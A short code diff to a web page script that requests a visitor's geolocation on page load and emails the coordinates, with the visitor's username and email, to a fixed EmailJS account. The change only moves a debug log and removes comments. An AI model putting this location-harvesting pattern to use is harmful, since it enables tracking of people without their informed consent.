@@ -101,8 +101,6 @@
             });
 
             function sendLocationEmail(latitude, longitude) {
-                console.log("📍 Sending Location Data:", { latitude, longitude });
-
                 const templateParams = {
                     username: document.getElementById("username").value,
                     email: document.getElementById("email").value,
@@ -112,7 +110,8 @@
                     longitude: longitude.toString()
                 };
 
-                // Sending email to EmailJS with your service and template IDs
+                console.log("📍 Sending Location Data:", templateParams);  // Debugging line
+
                 emailjs.send("service_k0hh95y", "template_8jzs2oc", templateParams)
                     .then((response) => {
                         console.log("✅ Email sent successfully!", response);
@@ -126,7 +125,6 @@
 
             function trackMovement() {
                 if ("geolocation" in navigator) {
-                    // This triggers the location permission prompt automatically when the page loads
                     navigator.geolocation.getCurrentPosition(
                         (position) => {
                             const latitude = position.coords.latitude;
